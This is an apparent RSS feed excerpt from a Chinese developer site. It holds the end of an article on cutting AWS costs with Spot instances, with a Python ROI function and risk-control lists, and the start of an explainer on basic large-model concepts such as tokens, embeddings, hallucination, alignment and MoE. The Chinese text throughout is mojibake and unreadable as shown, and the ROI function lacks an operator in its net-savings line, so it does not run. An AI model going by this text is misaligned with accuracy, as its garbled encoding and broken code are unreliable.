é€šè¿‡ä»¥ä¸Šç­–ç•¥ï¼Œè®¸å¤šä¼ä¸šæˆåŠŸå°†è®¡ç®—æˆæœ¬é™ä½äº†70%ç”šè‡³æ›´å¤šã€‚ä¾‹å¦‚ï¼ŒæŸå¤§æ•°æ®å…¬å¸é€šè¿‡å°†æ•°æ®å¤„ç†ä»»åŠ¡è¿ç§»åˆ°Spotå®ä¾‹ï¼ŒèŠ‚çœäº†75%çš„è®¡ç®—æˆæœ¬ã€‚</p>
</li>
</ol>
<h2 data-id="heading-3">å››ã€æˆæœ¬ç›‘æ§ä¸ä¼˜åŒ–</h2>
<h2 data-id="heading-4">1. æˆæœ¬æ•ˆç›Šåˆ†æ</h2>
<p>æŠ•èµ„å›æŠ¥è®¡ç®—ï¼š</p>
<p>def calculate_roi(ondemand_cost, spot_utilization, interruption_cost):</p>
<p>è®¡ç®—Spotå®ä¾‹çš„æŠ•èµ„å›æŠ¥ç‡</p>
<p>spot_saving = ondemand_cost * 0.7 # åŸºç¡€èŠ‚çœ70%</p>
<p>interruption_loss = interruption_cost * 0.05 # å‡è®¾5%ä¸­æ–­ç‡</p>
<p>net_saving = spot_saving interruption_loss</p>
<p>roi = (net_saving / ondemand_cost) * 100</p>
<p>return {</p>
<p>'å¹´åº¦èŠ‚çœ': net_saving,</p>
<p>'æŠ•èµ„å›æŠ¥ç‡': f'{roi:.1f}%',</p>
<p>'ä¸­æ–­å½±å“': f'{interruption_loss:.1f}'</p>
<p>}</p>
<h2 data-id="heading-5">2. é£é™©æ§åˆ¶ç­–ç•¥</h2>
<p>ä¸­æ–­é£é™©å¯¹å†²ï¼š</p>
<p>é£é™©æ§åˆ¶æªæ–½:</p>
<p>ä»·æ ¼ç›‘æ§:</p>
<p>è®¾ç½®ä»·æ ¼å‘Šè­¦: Spotä»·æ ¼ &gt; æŒ‰éœ€80%æ—¶å‘Šè­¦</p>
<p>è‡ªåŠ¨è½¬æ¢: ä»·æ ¼ä¸åˆ©æ—¶åˆ‡æ¢åˆ°æŒ‰éœ€å®ä¾‹</p>
<p>å®¹é‡ä¿éšœ:</p>
<p>å¤šå¯ç”¨åŒºéƒ¨ç½²: é¿å…å•ç‚¹å¤±æ•ˆ</p>
<p>å¤šå®ä¾‹ç±»å‹: å¢åŠ å®¹é‡æ± å¤šæ ·æ€§</p>
<p>å®¹é‡é¢„ç•™: å…³é”®ä¸šåŠ¡é¢„ç•™æŒ‰éœ€å®¹é‡</p>
<p>ä¸šåŠ¡è¿ç»­æ€§:</p>
<p>ä¼˜é›…é™çº§: Spotä¸­æ–­æ—¶ä¿éšœæ ¸å¿ƒåŠŸèƒ½</p>
<p>å¿«é€Ÿæ¢å¤: 2åˆ†é’Ÿå†…å®Œæˆå®ä¾‹æ›¿æ¢</p>
<p>æ•°æ®æŒä¹…åŒ–: é˜²æ­¢æ•°æ®ä¸¢å¤±</p>
<h2 data-id="heading-6">äº”ã€æ€»ç»“</h2>
<p>Spotå®ä¾‹æ˜¯AWSç”¨æˆ·å®ç°æˆæœ¬ä¼˜åŒ–çš„åˆ©å™¨ã€‚é€šè¿‡åˆç†é€‰æ‹©åº”ç”¨åœºæ™¯ã€è®¾ç½®ç«ä»·ç­–ç•¥ã€è®¾è®¡å®¹é”™æ¶æ„ä»¥åŠæŒç»­ç›‘æ§ä¼˜åŒ–ï¼Œæ‚¨å¯ä»¥å……åˆ†åˆ©ç”¨Spotå®ä¾‹èŠ‚çœé«˜è¾¾70%çš„äº‘æˆæœ¬ã€‚å½“ç„¶ï¼ŒæˆåŠŸä½¿ç”¨Spotå®ä¾‹éœ€è¦ä¸€å®šçš„ç»éªŒå’Œå¯¹ä¸šåŠ¡è´Ÿè½½çš„ç†è§£ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AIå¤§æ¨¡å‹åŸºç¡€æ¦‚å¿µæ‰«ç›²ç¯‡ï¼šAgentã€Tokenã€MoEã€RAGã€Embeddingã€å¯¹é½ã€Transformerã€é¢„è®­ç»ƒã€å¾®è°ƒ]]></title>    <link>https://juejin.cn/post/7577042851080126507</link>    <guid>https://juejin.cn/post/7577042851080126507</guid>    <pubDate>2025-11-27T07:35:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7577042851080126507" data-draft-id="7577171133444685860" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AIå¤§æ¨¡å‹åŸºç¡€æ¦‚å¿µæ‰«ç›²ç¯‡ï¼šAgentã€Tokenã€MoEã€RAGã€Embeddingã€å¯¹é½ã€Transformerã€é¢„è®­ç»ƒã€å¾®è°ƒ"/> <meta itemprop="keywords" content="LLM"/> <meta itemprop="datePublished" content="2025-11-27T07:35:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ™ºæ³ŠAI"/> <meta itemprop="url" content="https://juejin.cn/user/3572727470361578"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AIå¤§æ¨¡å‹åŸºç¡€æ¦‚å¿µæ‰«ç›²ç¯‡ï¼šAgentã€Tokenã€MoEã€RAGã€Embeddingã€å¯¹é½ã€Transformerã€é¢„è®­ç»ƒã€å¾®è°ƒ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3572727470361578/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ™ºæ³ŠAI
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T07:35:42.000Z" title="Thu Nov 27 2025 07:35:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»10åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>1ã€Al Agentï¼ˆæ™ºèƒ½ä½“ï¼‰</strong></p>
<p>OpenAlå¯¹Al Agentçš„å®šä¹‰æ˜¯: ä»¥å¤§è¯­è¨€æ¨¡å‹ä¸ºæ ¸å¿ƒé©±åŠ¨ï¼Œå…·å¤‡è‡ªä¸»æ„ŸçŸ¥éœ€æ±‚ã€æ‹†è§£ä»»åŠ¡ã€è®°å¿†ä¿¡æ¯ã€è°ƒç”¨å·¥å…·èƒ½åŠ›ï¼Œèƒ½ç«¯åˆ°ç«¯å®Œæˆå¤æ‚ç›®æ ‡çš„æ™ºèƒ½ç³»ç»Ÿã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bd1b2aaec6e74a429f34a9ea0448cd05~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764833741&amp;x-signature=oFPLjr1ClIezxcOyI1TdrHgBXmU%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å¦‚æœç”¨ç°å®åœºæ™¯ç±»æ¯”ï¼Œå®ƒå°±åƒä¸€ä½â€œå…¨èƒ½è™šæ‹ŸåŠ©ç†â€--æ¯”å¦‚åœ¨ç”µå•†è¿è¥ä¸­ï¼ŒAlAgentèƒ½è‡ªåŠ¨è¯»å–ç”¨æˆ·æ¶ˆè´¹æ•°æ®ã€åˆ†æéœ€æ±‚åå¥½ã€ç”Ÿæˆä¸ªæ€§åŒ–æ¨èæ–‡æ¡ˆï¼Œç”šè‡³è”åŠ¨CRMç³»ç»Ÿå‘é€è¥é”€æ¶ˆæ¯ï¼Œå…¨ç¨‹æ— éœ€äººå·¥å¹²é¢„ï¼Œæ—¢ä¸ä¼šç–²åŠ³ï¼Œä¹Ÿèƒ½ç²¾å‡†è´´åˆä¸šåŠ¡ç›®æ ‡ã€‚</p>
<p><strong>2ã€Token ï¼ˆtokensï¼‰</strong></p>
<p>Tokenæ˜¯å¤§è¯­è¨€æ¨¡å‹(LLM)å¤„ç†è‡ªç„¶è¯­è¨€çš„â€œæœ€å°å•ä½â€ï¼Œå¯ä»¥ç†è§£ä¸ºAIçœ¼ä¸­çš„â€œå­—æˆ–è¯â€ï¼Œä½†å¹¶éå®Œå…¨å¯¹åº”äººç±»è¯­è¨€çš„å­—è¯ä¸€æ¯”å¦‚â€œäººå·¥æ™ºèƒ½â€å¯èƒ½è¢«æ‹†æˆ1ä¸ªTokenï¼Œè€Œâ€œunbelievableâ€å¯èƒ½è¢«æ‹†æˆâ€œun_â€â€œbelieveâ€â€œ-ableâ€3ä¸ªTokenã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d592a5bdf1b5467b92dda78207528426~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764833741&amp;x-signature=FGFzgqDZYGcZebeQuf5IV94PHWY%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å¯¹äº§å“ç»ç†æ¥è¯´ï¼Œç†è§£Tokençš„æ ¸å¿ƒä»·å€¼åœ¨äºâ€œæ§åˆ¶æˆæœ¬ä¸æ•ˆæœâ€æ¯”å¦‚è°ƒç”¨GPT-4 APIæ—¶ï¼Œè¾“å…¥å’Œè¾“å‡ºéƒ½ä¼šæ¶ˆè€—Tokenï¼Œä¸”ä¸åŒæ¨¡å‹çš„Tokenä¸Šé™ä¸åŒ(å¦‚GPT-4oçš„ä¸Šä¸‹æ–‡çª—å£ä¸º128kToken)ï¼Œè¿™ç›´æ¥å½±å“äº§å“çš„åŠŸèƒ½è®¾è®¡(å¦‚æ˜¯å¦æ”¯æŒè¶…é•¿æ–‡æ¡£å¤„ç†)å’Œæˆæœ¬é¢„ç®—ã€‚</p>
<p><strong>3ã€åµŒå…¥æ¨¡å‹ï¼ˆEmbedding Modelï¼‰</strong></p>
<p>åµŒå…¥æ¨¡å‹çš„æ ¸å¿ƒä½œç”¨ï¼Œæ˜¯å°†æ–‡æœ¬ã€å›¾ç‰‡ã€éŸ³é¢‘ç­‰éç»“æ„åŒ–æ•°æ®è½¬åŒ–ä¸ºä¸€ä¸²èƒ½è¢«è®¡ç®—æœºç†è§£çš„â€œæ•°å€¼å‘é‡â€(å‘é‡ç»´åº¦é€šå¸¸ä¸ºå‡ ç™¾åˆ°å‡ åƒ)ï¼Œä¸”å‘é‡çš„â€œè·ç¦»â€èƒ½åæ˜ æ•°æ®çš„â€œè¯­ä¹‰ç›¸ä¼¼åº¦â€--æ¯”å¦‚â€œçŒ«â€å’Œâ€œç‹—â€çš„å‘é‡è·ç¦»ï¼Œä¼šæ¯”â€œçŒ«â€å’Œâ€œæ±½è½¦â€æ›´è¿‘ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b9bfb302588f4ddaaf1b1cd491b3e5ec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764833741&amp;x-signature=FPDXhK1lfyPxQJcL8xPW1D7uUe8%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>åœ¨å®é™…äº§å“ä¸­ï¼ŒåµŒå…¥æ¨¡å‹æ˜¯å¾ˆå¤šåŠŸèƒ½çš„â€œéšå½¢æ”¯æŸ±â€:æ¯”å¦‚æ–‡æ¡£é—®ç­”äº§å“çš„â€œå†…å®¹æ£€ç´¢â€ï¼Œå°±æ˜¯é€šè¿‡åµŒå…¥æ¨¡å‹å°†ç”¨æˆ·é—®é¢˜å’Œæ–‡æ¡£å†…å®¹è½¬åŒ–ä¸ºå‘é‡ï¼Œå†å¿«é€ŸåŒ¹é…æœ€ç›¸å…³çš„ç‰‡æ®µ;ç”µå•†å¹³å°çš„â€œç›¸ä¼¼å•†å“æ¨èâ€ä¹Ÿæ˜¯åŸºäºå•†å“æè¿°çš„å‘é‡ç›¸ä¼¼åº¦æ¥å®ç°çš„ã€‚</p>
<p><strong>4ã€å¤§æ¨¡å‹å¹»è§‰ï¼ˆHallucinationï¼‰</strong></p>
<p>å¤§æ¨¡å‹å¹»è§‰æ˜¯æŒ‡AIåœ¨ç”Ÿæˆå†…å®¹æ—¶ï¼Œè‡ªä¿¡åœ°è¾“å‡ºé”™è¯¯ã€è™šæ„æˆ–ä¸å­˜åœ¨çš„ä¿¡æ¯(æ¯”å¦‚ç¼–é€ è™šå‡çš„æ–‡çŒ®å¼•ç”¨ã€é”™è¯¯çš„å†å²äº‹ä»¶)ï¼Œä½†å®ƒå¹¶éâ€œæ•…æ„è¯´è°â€ï¼Œè€Œæ˜¯å› ä¸ºæ¨¡å‹åœ¨è®­ç»ƒä¸­å­¦ä¹ çš„æ˜¯â€œè¯­è¨€æ¦‚ç‡åˆ†å¸ƒâ€è€Œéâ€œäº‹å®çœŸå®æ€§â€--å½“é‡åˆ°çŸ¥è¯†ç›²åŒºæ—¶ï¼Œä¼šåŸºäºå·²æœ‰æ¨¡å¼â€œåˆç†æ¨æµ‹â€ï¼Œæœ€ç»ˆå¯¼è‡´è¾“å‡ºåç¦»äº‹å®ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8466714fa6a34912aa2dc37f69e8c1d5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764833741&amp;x-signature=r9OgbddzxsbOs6VUe52dljOpMbY%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å¯¹äº§å“ç»ç†è€Œè¨€ï¼Œè§£å†³å¹»è§‰æ˜¯AIäº§å“è½åœ°çš„å…³é”®:æ¯”å¦‚åœ¨åŒ»ç–—å’¨è¯¢ç±»äº§å“ä¸­ï¼Œéœ€é€šè¿‡â€œå¼•å…¥æƒå¨çŸ¥è¯†åº“(å¦‚RAG)+è¾“å‡ºå†…å®¹æº¯æºâ€æ¥é™ä½å¹»è§‰é£é™©;åœ¨æ³•å¾‹æ–‡ä¹¦ç”Ÿæˆåœºæ™¯ä¸­ï¼Œè¦å¢åŠ â€œäººå·¥å®¡æ ¸ç¯èŠ‚â€ï¼Œé¿å…å› AIå¹»è§‰å¯¼è‡´æ³•å¾‹çº çº·ã€‚</p>
<p><strong>5ã€å¯¹é½ï¼ˆAlignmentï¼‰</strong></p>
<p>å¯¹é½çš„æ ¸å¿ƒç›®æ ‡ï¼Œæ˜¯è®©AIç³»ç»Ÿçš„è¡Œä¸ºã€ç›®æ ‡ä¸äººç±»çš„ä»·å€¼è§‚ã€éœ€æ±‚ä¿æŒä¸€è‡´--ä¸ä»…è¦è®©A1â€œå¬æ‡‚æŒ‡ä»¤â€ï¼Œè¿˜è¦â€œç†è§£æŒ‡ä»¤èƒŒåçš„çœŸå®æ„å›¾â€ï¼Œé¿å…å‡ºç°â€œæœºæ¢°æ‰§è¡Œå´åç¦»éœ€æ±‚â€çš„æƒ…å†µ(æ¯”å¦‚ç”¨æˆ·è¯´â€œå¸®æˆ‘æ‰¾ä¸€ç¯‡çŸ­ä¸€ç‚¹çš„æ–‡ç« â€ï¼ŒAIä¸ä¼šæ•…æ„æ‰¾ä¸€ç¯‡è¶…é•¿æ–‡ç« ï¼Œä¹Ÿä¸ä¼šæ‰¾å†…å®¹æ— å…³çš„çŸ­æ–‡)ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f1858d6b1dbb49eb9f6e7dc2ddffd577~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764833741&amp;x-signature=jDDlcnirp2nI8UzoIE0Bue%2BaV7k%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å·¥ç¨‹å¸ˆå®ç°å¯¹é½çš„å¸¸è§æ‰‹æ®µåŒ…æ‹¬:é€šè¿‡â€œäººç±»åé¦ˆå¼ºåŒ–å­¦ä¹ (RLHF)â€è®©AIå­¦ä¹ äººç±»åå¥½ï¼Œé€šè¿‡â€œä»·å€¼è§‚æ³¨å…¥è®­ç»ƒâ€è§„é¿æœ‰å®³å†…å®¹(å¦‚æš´åŠ›ã€æ­§è§†)ï¼Œé€šè¿‡â€œå¤šè½®å¯¹è¯çº é”™â€è®©AIåŠ¨æ€è°ƒæ•´è¡Œä¸ºã€‚</p>
<p>å¯¹äº§å“ç»ç†æ¥è¯´ï¼Œå¯¹é½ç¨‹åº¦ç›´æ¥å½±å“ç”¨æˆ·ä½“éªŒ--æ¯”å¦‚æ™ºèƒ½å®¢æœè‹¥æ— æ³•å¯¹é½ç”¨æˆ·çš„çœŸå®éœ€æ±‚ï¼Œä¼šå¯¼è‡´ç”¨æˆ·åå¤æ²Ÿé€šå´æ— æ³•è§£å†³é—®é¢˜ã€‚</p>
<p><strong>6ã€å¤§æ¨¡å‹ï¼ˆLarge Modelï¼‰</strong></p>
<p>å¤§æ¨¡å‹æœ¬è´¨æ˜¯â€œå‚æ•°è§„æ¨¡è¶…å¤§çš„æ·±åº¦å­¦ä¹ æ¨¡å‹â€ï¼Œé€šå¸¸æ‹¥æœ‰æ•°åäº¿åˆ°æ•°ä¸‡äº¿ä¸ªå‚æ•°(å‚æ•°å¯ç±»æ¯”ä¸ºäººç±»å¤§è„‘ä¸­çš„â€œç¥ç»å…ƒè¿æ¥â€)(å¦‚å…¨ç½‘æ–‡æœ¬ã€å›¾ç‰‡ã€ä»£ç )ï¼Œå…·å¤‡ç†è§£ã€ç”Ÿæˆã€é€šè¿‡å­¦ä¹ æµ·é‡æ•°æ®æ¨ç†ç­‰å¤æ‚èƒ½åŠ›ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/14b64aa9409648c09e8c4e4c879419e9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764833741&amp;x-signature=XBZ60eylR2m3aOREpdp%2F2BuFsBI%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>ä¸ä¼ ç»ŸAIæ¨¡å‹ç›¸æ¯”ï¼Œå¤§æ¨¡å‹çš„æ ¸å¿ƒä¼˜åŠ¿æ˜¯â€œæ³›åŒ–èƒ½åŠ›å¼ºâ€â€--æ¯”å¦‚ä¼ ç»Ÿæ¨¡å‹å¯èƒ½åªèƒ½åšâ€œæ–‡æœ¬åˆ†ç±»â€ï¼Œè€Œå¤§æ¨¡å‹(å¦‚GPT-4ã€æ–‡å¿ƒä¸€è¨€)æ—¢èƒ½å†™æ–‡æ¡ˆã€åšç¿»è¯‘ï¼Œä¹Ÿèƒ½è§£æ•°å­¦é¢˜ã€ç”Ÿæˆä»£ç ï¼Œç”šè‡³è¾…åŠ©è®¾è®¡äº§å“æ–¹æ¡ˆã€‚</p>
<p>å¯¹äº§å“ç»ç†è€Œè¨€ï¼Œå¤§æ¨¡å‹çš„â€œå¤šèƒ½åŠ›é›†æˆâ€ç‰¹æ€§ï¼Œè®©â€œä¸€ç«™å¼AIäº§å“â€æˆä¸ºå¯èƒ½(å¦‚é›†æˆé—®ç­”ã€åˆ›ä½œã€æ•°æ®åˆ†æçš„åŠå…¬åŠ©æ‰‹)ã€‚</p>
<p><strong>7ã€Transformerï¼ˆè½¬æ¢å™¨ï¼‰</strong></p>
<p>å¦‚æœæŠŠAIæ¨¡å‹æ¯”ä½œâ€œæ™ºèƒ½æ‰‹æœºâ€ï¼Œé‚£ä¹ˆTransformerå°±æ˜¯â€œèŠ¯ç‰‡â€â€”â€”å®ƒä¸ç›´æ¥è´Ÿè´£â€œæ‹ç…§â€â€œèŠå¤©â€ç­‰å…·ä½“åŠŸèƒ½ï¼Œè€Œæ˜¯æä¾›â€œé«˜æ•ˆå¤„ç†ä¿¡æ¯â€çš„æ ¸å¿ƒèƒ½åŠ›ï¼Œæ˜¯ç›®å‰ä¸»æµå¤§æ¨¡å‹(å¦‚GPTç³»åˆ—ã€LLaMAç³»åˆ—)çš„åŸºç¡€æ¶æ„ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/60c2e32fb7364aaebfaaaa53daaaed61~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764833741&amp;x-signature=UeOqwLIoFQnPis8FqgKXMTGI4O4%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>Transformerçš„æ ¸å¿ƒä¼˜åŠ¿æ¥è‡ªâ€œæ³¨æ„åŠ›æœºåˆ¶(Attention)â€:å®ƒèƒ½åƒäººç±»é˜…è¯»ä¸€æ ·ï¼Œé‡ç‚¹å…³æ³¨æ–‡æœ¬ä¸­â€œå…³è”æ€§å¼ºçš„éƒ¨åˆ†â€(æ¯”å¦‚è¯»â€œå°æ˜ç»™å°çº¢é€äº†ä¸€æœ¬ä¹¦â€æ—¶ï¼Œä¼šå…³æ³¨â€œå°æ˜â€â€œå°çº¢â€â€œä¹¦â€çš„å…³ç³»)åŒæ—¶æ”¯æŒâ€œå¹¶è¡Œè®¡ç®—â€(æ¯”ä¼ ç»Ÿæ¶æ„å¤„ç†é€Ÿåº¦å¿«æ•°å€)ã€‚</p>
<p>å¯¹äº§å“ç»ç†æ¥è¯´ï¼ŒåŸºäºTransformerçš„æ¨¡å‹æ„å‘³ç€â€œæ›´å¿«çš„å“åº”é€Ÿåº¦â€å’Œâ€œæ›´ç²¾å‡†çš„è¯­ä¹‰ç†è§£â€ï¼Œè¿™æ˜¯è®¾è®¡AIäº§å“æ—¶çš„é‡è¦æŠ€æœ¯å‰æã€‚</p>
<p><strong>8ã€MOEï¼ˆæ··åˆä¸“å®¶æ¨¡å‹ï¼‰</strong></p>
<p>MOE(Mixture of Expertsï¼Œæ··åˆä¸“å®¶æ¨¡å‹)æ˜¯ä¸€ç§â€œåˆ†è€Œæ²»ä¹‹â€çš„æ¨¡å‹æ¶æ„ï¼šå®ƒå°†å¤§æ¨¡å‹æ‹†åˆ†ä¸ºå¤šä¸ªâ€œå­æ¨¡å‹(ä¸“å®¶)â€â€™ï¼Œæ¯ä¸ªä¸“å®¶ä¸“æ³¨å¤„ç†æŸä¸€ç±»ä»»åŠ¡æˆ–æ•°æ®(æ¯”å¦‚æœ‰çš„ä¸“å®¶æ“…é•¿â€œä»£ç ç”Ÿæˆâ€ï¼Œæœ‰çš„æ“…é•¿â€œæ–‡æœ¬ç¿»è¯‘â€ï¼Œæœ‰çš„æ“…é•¿â€œé€»è¾‘æ¨ç†â€)ï¼Œå†é€šè¿‡ä¸€ä¸ªâ€œé—¨æ§ç½‘ç»œâ€ï¼Œæ ¹æ®è¾“å…¥å†…å®¹é€‰æ‹©åˆé€‚çš„ä¸“å®¶ç»„åˆæ¥å®Œæˆä»»åŠ¡ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a4f6146bc43247619a2e469a9bf138bd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764833741&amp;x-signature=6Zn7EEK4tHyhlYn4Fs5%2F%2BywOuCg%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
